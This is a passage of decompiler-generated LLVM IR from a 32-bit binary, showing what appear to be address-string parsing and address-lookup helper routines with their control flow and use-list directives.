  %v6_804d83b53 = phi i32 [ %v6_804d83b44, %dec_label_pc_804d7eb.lr.ph ], [ %v6_804d83b, %dec_label_pc_804d835 ]
  %v3_804d83b52 = phi i32 [ %v3_804d83b42, %dec_label_pc_804d7eb.lr.ph ], [ %v3_804d83b, %dec_label_pc_804d835 ]
  %v2_804d83b51 = phi i8 [ %v2_804d83b41, %dec_label_pc_804d7eb.lr.ph ], [ %v2_804d83b, %dec_label_pc_804d835 ]
  %v0_804d86250 = phi i32 [ %v0_804d83b4, %dec_label_pc_804d7eb.lr.ph ], [ %v1_804d835, %dec_label_pc_804d835 ]
  %v4_804d85049 = phi i32 [ 0, %dec_label_pc_804d7eb.lr.ph ], [ %storemerge, %dec_label_pc_804d835 ]
  %v0_804d84148 = phi i32 [ %v0_804d84113, %dec_label_pc_804d7eb.lr.ph ], [ 1, %dec_label_pc_804d835 ]
  %v0_804d7eb = load i32, i32* @global_var_8056440, align 64
  %v2_804d7f3 = mul nuw nsw i32 %v3_804d83b52, 2
  %v3_804d7f3 = add i32 %v0_804d7eb, %v2_804d7f3
  %v4_804d7f3 = inttoptr i32 %v3_804d7f3 to i16*
  %v5_804d7f3 = load i16, i16* %v4_804d7f3, align 2
  %v6_804d7f3 = zext i16 %v5_804d7f3 to i32
  store i32 %v6_804d7f3, i32* @eax, align 4
  %v2_804d7f7 = and i16 %v5_804d7f3, 8
  %v3_804d7f7 = icmp eq i16 %v2_804d7f7, 0
  br i1 %v3_804d7f7, label %dec_label_pc_804d810, label %dec_label_pc_804d7fb

dec_label_pc_804d7fb:                             ; preds = %dec_label_pc_804d7eb
  br i1 %v1_804d7fe, label %dec_label_pc_804d805, label %dec_label_pc_804d800

dec_label_pc_804d800:                             ; preds = %dec_label_pc_804d7fb
  %tmp = icmp ult i8 %v2_804d83b51, 56
  br i1 %tmp, label %dec_label_pc_804d805, label %dec_label_pc_804d86c

dec_label_pc_804d805:                             ; preds = %dec_label_pc_804d800, %dec_label_pc_804d7fb
  %v4_804d807 = mul i32 %v4_804d85049, %v0_804d81010
  store i32 %v4_804d807, i32* @eax, align 4
  %v2_804d80a = add i32 %v4_804d807, -48
  %v3_804d80a = add i32 %v2_804d80a, %v3_804d83b52
  br label %dec_label_pc_804d82d

dec_label_pc_804d810:                             ; preds = %dec_label_pc_804d7eb
  br i1 %v1_804d813, label %dec_label_pc_804d841, label %dec_label_pc_804d815

dec_label_pc_804d815:                             ; preds = %dec_label_pc_804d810
  %v2_804d815 = and i32 %v6_804d7f3, 16
  %v3_804d815 = icmp eq i32 %v2_804d815, 0
  br i1 %v3_804d815, label %dec_label_pc_804d841, label %dec_label_pc_804d819

dec_label_pc_804d819:                             ; preds = %dec_label_pc_804d815
  store i32 0, i32* @eax, align 4
  %v2_804d826 = mul i32 %v4_804d85049, 16
  %v2_804d829 = add i32 %v2_804d826, -87
  br label %dec_label_pc_804d82d

dec_label_pc_804d82d:                             ; preds = %dec_label_pc_804d805, %dec_label_pc_804d819
  %v4_804d83b6 = phi i32 [ %v6_804d83b53, %dec_label_pc_804d805 ], [ %v2_804d826, %dec_label_pc_804d819 ]
  %storemerge = phi i32 [ %v3_804d80a, %dec_label_pc_804d805 ], [ %v2_804d829, %dec_label_pc_804d819 ]
  %tmp105 = icmp ult i32 %storemerge, 256
  br i1 %tmp105, label %dec_label_pc_804d835, label %dec_label_pc_804d86c

dec_label_pc_804d835:                             ; preds = %dec_label_pc_804d82d
  %v1_804d835 = add i32 %v0_804d86250, 1
  %v1_804d83b = inttoptr i32 %v1_804d835 to i8*
  %v2_804d83b = load i8, i8* %v1_804d83b, align 1
  %v3_804d83b = zext i8 %v2_804d83b to i32
  %v5_804d83b = and i32 %v4_804d83b6, -256
  %v6_804d83b = or i32 %v3_804d83b, %v5_804d83b
  store i32 %v6_804d83b, i32* @edx, align 4
  %v4_804d83d = icmp eq i8 %v2_804d83b, 0
  %v1_804d83f = icmp eq i1 %v4_804d83d, false
  br i1 %v1_804d83f, label %dec_label_pc_804d7eb, label %dec_label_pc_804d841.thread

dec_label_pc_804d841.thread:                      ; preds = %dec_label_pc_804d835
  br label %dec_label_pc_804d845

dec_label_pc_804d841:                             ; preds = %dec_label_pc_804d810, %dec_label_pc_804d815, %dec_label_pc_804d7e7
  %v0_804d841.lcssa = phi i32 [ %v0_804d84113, %dec_label_pc_804d7e7 ], [ %v0_804d84148, %dec_label_pc_804d815 ], [ %v0_804d84148, %dec_label_pc_804d810 ]
  %v4_804d850.lcssa = phi i32 [ 0, %dec_label_pc_804d7e7 ], [ %v4_804d85049, %dec_label_pc_804d815 ], [ %v4_804d85049, %dec_label_pc_804d810 ]
  %v0_804d862.lcssa = phi i32 [ %v0_804d83b4, %dec_label_pc_804d7e7 ], [ %v0_804d86250, %dec_label_pc_804d815 ], [ %v0_804d86250, %dec_label_pc_804d810 ]
  %v2_804d83b.lcssa = phi i8 [ %v2_804d83b41, %dec_label_pc_804d7e7 ], [ %v2_804d83b51, %dec_label_pc_804d815 ], [ %v2_804d83b51, %dec_label_pc_804d810 ]
  %v4_804d83d.lcssa = phi i1 [ true, %dec_label_pc_804d7e7 ], [ false, %dec_label_pc_804d815 ], [ false, %dec_label_pc_804d810 ]
  %v1_804d841 = icmp eq i32 %v0_804d841.lcssa, 0
  br i1 %v1_804d841, label %dec_label_pc_804d86c, label %dec_label_pc_804d845

dec_label_pc_804d845:                             ; preds = %dec_label_pc_804d841.thread, %dec_label_pc_804d841
  %v4_804d83d.lcssa102 = phi i1 [ true, %dec_label_pc_804d841.thread ], [ %v4_804d83d.lcssa, %dec_label_pc_804d841 ]
  %v2_804d83b.lcssa101 = phi i8 [ %v2_804d83b, %dec_label_pc_804d841.thread ], [ %v2_804d83b.lcssa, %dec_label_pc_804d841 ]
  %v0_804d862.lcssa100 = phi i32 [ %v1_804d835, %dec_label_pc_804d841.thread ], [ %v0_804d862.lcssa, %dec_label_pc_804d841 ]
  %v4_804d850.lcssa99 = phi i32 [ %storemerge, %dec_label_pc_804d841.thread ], [ %v4_804d850.lcssa, %dec_label_pc_804d841 ]
  %v3_804d845 = icmp eq i32 %v2_804d859, 0
  br i1 %v3_804d845, label %dec_label_pc_804d850, label %dec_label_pc_804d84b

dec_label_pc_804d84b:                             ; preds = %dec_label_pc_804d845
  %v5_804d84b = mul i32 %v3_804d84b, 256
  br label %dec_label_pc_804d850

dec_label_pc_804d850:                             ; preds = %dec_label_pc_804d845, %dec_label_pc_804d84b
  %v3_804d850 = phi i32 [ %v3_804d84b, %dec_label_pc_804d845 ], [ %v5_804d84b, %dec_label_pc_804d84b ]
  %v5_804d850 = or i32 %v3_804d850, %v4_804d850.lcssa99
  %v10_804d854 = icmp eq i8 %v2_804d83b.lcssa101, 46
  %v1_804d857 = icmp eq i1 %v10_804d854, false
  br i1 %v1_804d857, label %dec_label_pc_804d868, label %dec_label_pc_804d859

dec_label_pc_804d859:                             ; preds = %dec_label_pc_804d850
  %v11_804d85c = icmp eq i32 %v2_804d859, 3
  br i1 %v11_804d85c, label %dec_label_pc_804d86c, label %dec_label_pc_804d862

dec_label_pc_804d862:                             ; preds = %dec_label_pc_804d859
  %v3_804d859 = add i32 %v2_804d859, 1
  %v1_804d862 = add i32 %v0_804d862.lcssa100, 1
  br label %dec_label_pc_804d7ba

dec_label_pc_804d868:                             ; preds = %dec_label_pc_804d850
  br i1 %v4_804d83d.lcssa102, label %dec_label_pc_804d874, label %dec_label_pc_804d86c

dec_label_pc_804d86c:                             ; preds = %dec_label_pc_804d859, %dec_label_pc_804d841, %dec_label_pc_804d82d, %dec_label_pc_804d800, %dec_label_pc_804d868
  br label %dec_label_pc_804d874

dec_label_pc_804d874:                             ; preds = %dec_label_pc_804d868, %dec_label_pc_804d86c
  %v3_804d874 = phi i32 [ %v5_804d850, %dec_label_pc_804d868 ], [ -1, %dec_label_pc_804d86c ]
  ret i32 %v3_804d874

; uselistorder directives
  uselistorder i32 %v5_804d850, { 1, 0 }
  uselistorder i32 %v6_804d83b, { 1, 0 }
  uselistorder i32 %v3_804d83b, { 1, 0 }
  uselistorder i8 %v2_804d83b, { 0, 2, 3, 1 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v2_804d826, { 1, 0 }
  uselistorder i32 %v4_804d807, { 1, 0 }
  uselistorder i32 %v4_804d85049, { 2, 3, 1, 0 }
  uselistorder i8 %v2_804d83b51, { 1, 2, 0 }
  uselistorder i32 %v0_804d81010, { 0, 2, 1 }
  uselistorder i32 %v0_804d7c8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804d859, { 1, 0, 2 }
  uselistorder i32 %v3_804d84b, { 1, 0 }
  uselistorder label %dec_label_pc_804d874, { 1, 0 }
  uselistorder label %dec_label_pc_804d86c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804d850, { 1, 0 }
  uselistorder label %dec_label_pc_804d845, { 1, 0 }
  uselistorder label %dec_label_pc_804d841, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d82d, { 1, 0 }
  uselistorder label %dec_label_pc_804d7eb, { 1, 0 }
  uselistorder label %dec_label_pc_804d7e7, { 2, 0, 1 }
}

define i32 @function_804d880(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d880:
  %stack_var_-4 = alloca i32, align 4
  %v2_804d883 = ptrtoint i32* %stack_var_-4 to i32
  %v2_804d88c = inttoptr i32 %arg1 to i8*
  %v3_804d88c = call i32 @function_8050b70(i8* %v2_804d88c, i32 %v2_804d883)
  store i32 -1, i32* @edx, align 4
  %v1_804d897 = icmp eq i32 %v3_804d88c, 0
  br i1 %v1_804d897, label %dec_label_pc_804d89f, label %dec_label_pc_804d89b

dec_label_pc_804d89b:                             ; preds = %dec_label_pc_804d880
  %v3_804d89b = load i32, i32* %stack_var_-4, align 4
  store i32 %v3_804d89b, i32* @edx, align 4
  br label %dec_label_pc_804d89f

dec_label_pc_804d89f:                             ; preds = %dec_label_pc_804d880, %dec_label_pc_804d89b
  %v0_804d89f = phi i32 [ -1, %dec_label_pc_804d880 ], [ %v3_804d89b, %dec_label_pc_804d89b ]
  ret i32 %v0_804d89f

; uselistorder directives
  uselistorder label %dec_label_pc_804d89f, { 1, 0 }
}

define i32 @function_804d8a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d8a8:
  %stack_var_-4 = alloca i32, align 4
  %v0_804d8ab = call i32 @function_804fe9c()
  %v0_804d8b0 = load i32, i32* @edx, align 4
  %v2_804d8b3 = ptrtoint i32* %stack_var_-4 to i32
  %v9_804d8cb = call i32 @function_804d8d8(i32 %arg1, i32* nonnull @global_var_8058aec.136, i32 ptrtoint (i32* @global_var_8058920.135 to i32), i32 460, i32 %v2_804d8b3, i32 %v0_804d8ab, i32 %v0_804d8b0, i32 %v0_804d8b0)
  %v3_804d8d0 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_804d8d0
}

define i32 @function_804d8d8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804d8d8:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804d8d8 = load i32, i32* @ebp, align 4
  %v0_804d8d9 = load i32, i32* @edi, align 4
  %v0_804d8da = load i32, i32* @esi, align 4
  %v0_804d8db = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_804d8eb = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804d8eb, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804d8f6 = icmp eq i32 %arg1, 0
  br i1 %v4_804d8f6, label %dec_label_pc_804dc02, label %dec_label_pc_804d901

dec_label_pc_804d901:                             ; preds = %dec_label_pc_804d8d8
  %v1_804d901 = call i32 @function_804baa4(i32 %v0_804d8db)
  store i32 %v1_804d901, i32* %eax.global-to-local, align 4
  %v1_804d906 = inttoptr i32 %v1_804d901 to i32*
  %v2_804d906 = load i32, i32* %v1_804d906, align 4
  store i32 %v2_804d906, i32* @edi, align 4
  store i32 %v1_804d901, i32* @esi, align 4
  store i32 0, i32* %v1_804d906, align 4
  %v0_804d919 = load i32, i32* @ebx, align 4
  store i32 %v0_804d919, i32* %stack_var_-108, align 4
  %v7_804d925 = call i32 @function_805159c(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_804d919, i32 %arg5, i32 %arg6, i32 %v1_804d901)
  store i32 %v7_804d925, i32* %eax.global-to-local, align 4
  %v1_804d92d = icmp eq i32 %v7_804d925, 0
  br i1 %v1_804d92d, label %dec_label_pc_804dc02, label %dec_label_pc_804d935

dec_label_pc_804d935:                             ; preds = %dec_label_pc_804d901
  %v1_804d939 = inttoptr i32 %arg6 to i32*
  %v2_804d939 = load i32, i32* %v1_804d939, align 4
  store i32 %v2_804d939, i32* %edx.global-to-local, align 4
  %v9_804d93b = icmp eq i32 %v2_804d939, 1
  br i1 %v9_804d93b, label %dec_label_pc_804d955, label %dec_label_pc_804d940

dec_label_pc_804d940:                             ; preds = %dec_label_pc_804d935
  %v9_804d940 = icmp eq i32 %v2_804d939, 4
  br i1 %v9_804d940, label %dec_label_pc_804d955, label %dec_label_pc_804d945

dec_label_pc_804d945:                             ; preds = %dec_label_pc_804d940
  %v1_804d945 = add i32 %v2_804d939, 1
  %v8_804d945 = icmp eq i32 %v1_804d945, 0
  store i32 %v1_804d945, i32* %edx.global-to-local, align 4
  %v1_804d946 = icmp eq i1 %v8_804d945, false
  br i1 %v1_804d946, label %dec_label_pc_804dc02, label %dec_label_pc_804d94c

dec_label_pc_804d94c:                             ; preds = %dec_label_pc_804d945
  %v0_804d94c = load i32, i32* @esi, align 4
  %v1_804d94c = inttoptr i32 %v0_804d94c to i32*
  %v2_804d94c = load i32, i32* %v1_804d94c, align 4
  %v11_804d94c = icmp eq i32 %v2_804d94c, 2
  %v1_804d94f = icmp eq i1 %v11_804d94c, false
  br i1 %v1_804d94f, label %dec_label_pc_804dc02, label %dec_label_pc_804d955

dec_label_pc_804d955:                             ; preds = %dec_label_pc_804d94c, %dec_label_pc_804d940, %dec_label_pc_804d935
  %v0_804d955 = load i32, i32* @ebp, align 4
  %v1_804d957 = sub i32 0, %v0_804d955
  %v1_804d959 = urem i32 %v1_804d957, 4
  %v2_804d959 = icmp eq i32 %v1_804d959, 0
  store i32 %v1_804d959, i32* %eax.global-to-local, align 4
  %v0_804d95c = load i32, i32* @edi, align 4
  %v1_804d95c = load i32, i32* @esi, align 4
  %v2_804d95c = inttoptr i32 %v1_804d95c to i32*
  store i32 %v0_804d95c, i32* %v2_804d95c, align 4
  %v0_804d970.pre = load i32, i32* @ebx, align 4
  br i1 %v2_804d959, label %dec_label_pc_804d96c, label %dec_label_pc_804d960

dec_label_pc_804d960:                             ; preds = %dec_label_pc_804d955
  %v1_804d960 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d960 = sub i32 %v0_804d970.pre, %v1_804d960
  %v7_804d960 = icmp ult i32 %v0_804d970.pre, %v1_804d960
  br i1 %v7_804d960, label %dec_label_pc_804dbfd, label %dec_label_pc_804d968

dec_label_pc_804d968:                             ; preds = %dec_label_pc_804d960
  %v0_804d968 = load i32, i32* @ebp, align 4
  %v2_804d968 = add i32 %v0_804d968, %v1_804d960
  store i32 %v2_804d968, i32* @ebp, align 4
  store i32 %v2_804d960, i32* @ebx, align 4
  br label %dec_label_pc_804d96c

dec_label_pc_804d96c:                             ; preds = %dec_label_pc_804d955, %dec_label_pc_804d968
  %v0_804d970 = phi i32 [ %v2_804d960, %dec_label_pc_804d968 ], [ %v0_804d970.pre, %dec_label_pc_804d955 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_804d939, align 4
  %tmp41 = icmp ult i32 %v0_804d970, 4
  br i1 %tmp41, label %dec_label_pc_804dbfd, label %dec_label_pc_804d97f

dec_label_pc_804d97f:                             ; preds = %dec_label_pc_804d96c
  %v0_804d97f = load i32, i32* @ebx, align 4
  %v1_804d97f = add i32 %v0_804d97f, -4
  store i32 %v1_804d97f, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_804d97f, 8
  br i1 %tmp42, label %dec_label_pc_804dbfd, label %dec_label_pc_804d98b

dec_label_pc_804d98b:                             ; preds = %dec_label_pc_804d97f
  %v1_804d98b = add i32 %v0_804d97f, -12
  store i32 %v1_804d98b, i32* %eax.global-to-local, align 4
  %v0_804d98e = load i32, i32* @ebp, align 4
  %v1_804d98e = add i32 %v0_804d98e, 4
  store i32 %v1_804d98e, i32* %edx.global-to-local, align 4
  store i32 %v1_804d98e, i32* %stack_var_-92, align 4
  %v3_804d997 = inttoptr i32 %v1_804d98e to i32*
  store i32 %v0_804d98e, i32* %v3_804d997, align 4
  %v0_804d99a = load i32, i32* %edx.global-to-local, align 4
  %v1_804d99a = add i32 %v0_804d99a, 4
  %v2_804d99a = inttoptr i32 %v1_804d99a to i32*
  store i32 0, i32* %v2_804d99a, align 4
  %tmp43 = icmp ult i32 %v1_804d98b, 32
  br i1 %tmp43, label %dec_label_pc_804dbfd, label %dec_label_pc_804d9a7

dec_label_pc_804d9a7:                             ; preds = %dec_label_pc_804d98b
  %v0_804d9a7 = load i32, i32* @ebx, align 4
  %v1_804d9a7 = add i32 %v0_804d9a7, -44
  store i32 %v1_804d9a7, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_804d9a7, 256
  br i1 %tmp44, label %dec_label_pc_804dbfd, label %dec_label_pc_804d9ba

dec_label_pc_804d9ba:                             ; preds = %dec_label_pc_804d9a7
  %v0_804d9ba = load i32, i32* @ebp, align 4
  %v1_804d9ba = add i32 %v0_804d9ba, 12
  %v1_804d9c1 = add i32 %v0_804d9ba, 44
  store i32 %v1_804d9c1, i32* @edi, align 4
  store i32 %v1_804d9c1, i32* %stack_var_-108, align 4
  %v3_804d9ce = inttoptr i32 %v1_804d9c1 to i8*
  %v4_804d9ce = call i32 @function_804d528(i8* %v3_804d9ce, i32 %arg1, i32 %v1_804d9a7)
  %v0_804d9d3 = load i32, i32* @edi, align 4
  %v1_804d9d3 = load i32, i32* @ebp, align 4
  %v2_804d9d3 = add i32 %v1_804d9d3, 12
  %v3_804d9d3 = inttoptr i32 %v2_804d9d3 to i32*
  store i32 %v0_804d9d3, i32* %v3_804d9d3, align 4
  %v1_804d9da = add i32 %v0_804d9ba, 16
  %v2_804d9da = inttoptr i32 %v1_804d9da to i32*
  store i32 0, i32* %v2_804d9da, align 4
  %v2_804d9e1 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804d9e1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804d9e3 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_804d9e8 = inttoptr i32 %arg1 to i8*
  %v3_804d9e8 = call i32 @function_8050b70(i8* %v2_804d9e8, i32 %v0_804d9e3)
  store i32 %v3_804d9e8, i32* %eax.global-to-local, align 4
  %v1_804d9f0 = icmp eq i32 %v3_804d9e8, 0
  br i1 %v1_804d9f0, label %dec_label_pc_804da2c, label %dec_label_pc_804d9f4

dec_label_pc_804d9f4:                             ; preds = %dec_label_pc_804d9ba
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_804d9f8 = load i32, i32* @edi, align 4
  store i32 %v0_804d9f8, i32* %arg2, align 4
  %v1_804d9fa = add i32 %tmp18, 8
  %v2_804d9fa = inttoptr i32 %v1_804d9fa to i32*
  store i32 2, i32* %v2_804d9fa, align 4
  %v0_804da01 = load i32, i32* %edx.global-to-local, align 4
  %v1_804da01 = add i32 %v0_804da01, 12
  %v2_804da01 = inttoptr i32 %v1_804da01 to i32*
  store i32 4, i32* %v2_804da01, align 4
  %v2_804da08 = load i32, i32* %stack_var_-92, align 4
  %v1_804da0b = load i32, i32* %edx.global-to-local, align 4
  %v2_804da0b = add i32 %v1_804da0b, 16
  %v3_804da0b = inttoptr i32 %v2_804da0b to i32*
  store i32 %v2_804da08, i32* %v3_804da0b, align 4
  %v1_804da12 = load i32, i32* %edx.global-to-local, align 4
  %v2_804da12 = add i32 %v1_804da12, 4
  %v3_804da12 = inttoptr i32 %v2_804da12 to i32*
  store i32 %v1_804d9ba, i32* %v3_804da12, align 4
  %v0_804da19 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804da19, i32* %v1_804d8eb, align 4
  store i32 0, i32* %v1_804d939, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc02

dec_label_pc_804da2c:                             ; preds = %dec_label_pc_804d9ba
  %v0_804da2c = call i32 @function_8051358()
  store i32 %v0_804da2c, i32* @eax, align 4
  %v2_804da3c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804da3c, i32* @ebx, align 4
  store i32 %v2_804da3c, i32* %stack_var_-108, align 4
  %v2_804da41 = call i32 @function_804f65e(i32 %v2_804da3c, i32 134542939)
  store i32 %v2_804da41, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056450.137 to i32), i32* %stack_var_-108, align 4
  %v1_804da4d = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056450.137 to i32))
  %v0_804da52 = load i32, i32* @global_var_8059134.138, align 4
  store i32 %v0_804da52, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_8056450.137 to i32), i32* @ecx, align 4
  store i32 134542939, i32* @eax, align 4
  store i32 %v2_804da3c, i32* %stack_var_-108, align 4
  %v2_804da5d = call i32 @function_804f65e(i32 %v2_804da3c, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804da78 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804da7d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804da7d, i32* %eax.global-to-local, align 4
  store i32 %v2_804da7d, i32* %stack_var_-108, align 4
  %v0_804da87 = load i32, i32* @esi, align 4
  %v7_804da8e = call i32 @function_8050c04(i8* %v2_804d9e8, i32 1, i32 %v0_804da87, i32 ptrtoint (i32* @global_var_8059128.139 to i32), i32 %v2_804da7d, i32 %v2_804da78)
  store i32 %v7_804da8e, i32* %eax.global-to-local, align 4
  %v2_804da96 = icmp slt i32 %v7_804da8e, 0
  %v1_804da98 = icmp eq i1 %v2_804da96, false
  br i1 %v1_804da98, label %dec_label_pc_804daae, label %dec_label_pc_804da9a

dec_label_pc_804da9a:                             ; preds = %dec_label_pc_804da2c
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_804d939, align 4
  br label %dec_label_pc_804dc02

dec_label_pc_804daae:                             ; preds = %dec_label_pc_804da2c
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804dac1 = icmp ugt i32 %v1_804d9a7, 256
  %v15_804dac1 = icmp eq i32 %v0_804d9a7, 300
  %v2_804dac5 = or i1 %v10_804dac1, %v15_804dac1
  br i1 %v2_804dac5, label %dec_label_pc_804db60, label %dec_label_pc_804dac7

dec_label_pc_804dac7:                             ; preds = %dec_label_pc_804daae
  %v3_804daca = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804daca, i32* %stack_var_-108, align 4
  %v1_804dace = call i32 @function_804eac9(i32 %v3_804daca)
  store i32 %v1_804dace, i32* %eax.global-to-local, align 4
  store i32 %v3_804daca, i32* @edi, align 4
  %v3_804dad4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804dad4, i32* %stack_var_-108, align 4
  %v1_804dad8 = call i32 @function_804eac9(i32 %v3_804dad4)
  store i32 -1, i32* %v1_804d939, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dbd8

dec_label_pc_804db60:                             ; preds = %dec_label_pc_804daae
  %v3_804db65.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804db69.pre = load i32, i32* @edi, align 4
  store i32 %v0_804db69.pre, i32* %stack_var_-108, align 4
  %v3_804db6a = inttoptr i32 %v0_804db69.pre to i8*
  %v4_804db6a = call i32 @function_804d528(i8* %v3_804db6a, i32 %v3_804db65.pre, i32 %v1_804d9a7)
  store i32 %v4_804db6a, i32* %eax.global-to-local, align 4
  %v3_804db70 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804db70, i32* %stack_var_-108, align 4
  %v1_804db74 = call i32 @function_804eac9(i32 %v3_804db70)
  store i32 %v1_804db74, i32* %eax.global-to-local, align 4
  %v12_804db7c = icmp eq i32 %tmp10, 1
  %v1_804db81 = icmp eq i1 %v12_804db7c, false
  br i1 %v1_804db81, label %dec_label_pc_804dbdd, label %dec_label_pc_804db83

dec_label_pc_804db83:                             ; preds = %dec_label_pc_804db60
  %v0_804db83 = load i32, i32* @edx, align 4
  %v0_804db8a = load i32, i32* @ebp, align 4
  store i32 %v0_804db8a, i32* %stack_var_-108, align 4
  %v3_804db8b = inttoptr i32 %tmp to i16*
  %v4_804db8b = call i32 @function_804d4b8(i16* %v3_804db8b, i32 4, i32 %v0_804db83)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804db94 = load i32, i32* @edi, align 4
  store i32 %v0_804db94, i32* %arg2, align 4
  %v1_804db96 = add i32 %tmp18, 8
  %v2_804db96 = inttoptr i32 %v1_804db96 to i32*
  store i32 2, i32* %v2_804db96, align 4
  %v0_804db9d = load i32, i32* %eax.global-to-local, align 4
  %v1_804db9d = add i32 %v0_804db9d, 12
  %v2_804db9d = inttoptr i32 %v1_804db9d to i32*
  store i32 4, i32* %v2_804db9d, align 4
  %v3_804dba4 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804dba4, i32* %edx.global-to-local, align 4
  %v1_804dba8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804dba8 = add i32 %v1_804dba8, 16
  %v3_804dba8 = inttoptr i32 %v2_804dba8 to i32*
  store i32 %v3_804dba4, i32* %v3_804dba8, align 4
  %v1_804dbaf = load i32, i32* %eax.global-to-local, align 4
  %v2_804dbaf = add i32 %v1_804dbaf, 4
  %v3_804dbaf = inttoptr i32 %v2_804dbaf to i32*
  store i32 %v1_804d9ba, i32* %v3_804dbaf, align 4
  %v2_804dbb2 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804dbb2, i32* %eax.global-to-local, align 4
  %v3_804dbb3 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804dbb3, i32* %stack_var_-108, align 4
  %v1_804dbb7 = call i32 @function_804eac9(i32 %v3_804dbb3)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_804d8eb, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d939, align 4
  br label %dec_label_pc_804dbd8

dec_label_pc_804dbd8:                             ; preds = %dec_label_pc_804dbdd, %dec_label_pc_804dac7, %dec_label_pc_804db83
  br label %dec_label_pc_804dc02

dec_label_pc_804dbdd:                             ; preds = %dec_label_pc_804db60
  %v3_804dbe0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804dbe0, i32* %stack_var_-108, align 4
  %v1_804dbe4 = call i32 @function_804eac9(i32 %v3_804dbe0)
  store i32 1, i32* %v1_804d939, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dbd8

dec_label_pc_804dbfd:                             ; preds = %dec_label_pc_804d9a7, %dec_label_pc_804d98b, %dec_label_pc_804d97f, %dec_label_pc_804d96c, %dec_label_pc_804d960
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc02

dec_label_pc_804dc02:                             ; preds = %dec_label_pc_804d94c, %dec_label_pc_804d945, %dec_label_pc_804d901, %dec_label_pc_804d8d8, %dec_label_pc_804dbd8, %dec_label_pc_804da9a, %dec_label_pc_804d9f4, %dec_label_pc_804dbfd
  store i32 %v0_804d8db, i32* @ebx, align 4
  store i32 %v0_804d8da, i32* @esi, align 4
  store i32 %v0_804d8d9, i32* @edi, align 4
  store i32 %v0_804d8d8, i32* @ebp, align 4
  %v0_804dc09 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804dc09

; uselistorder directives
  uselistorder i32 %v2_804da3c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804d9c1, { 1, 0, 2 }
  uselistorder i32 %v1_804d9ba, { 1, 0 }
  uselistorder i32 %v1_804d9a7, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804d970.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804d959, { 1, 0 }
  uselistorder i32 %v2_804d939, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804d939, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_804d8eb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804dc02, { 7, 4, 5, 6, 0, 1, 2, 3 }
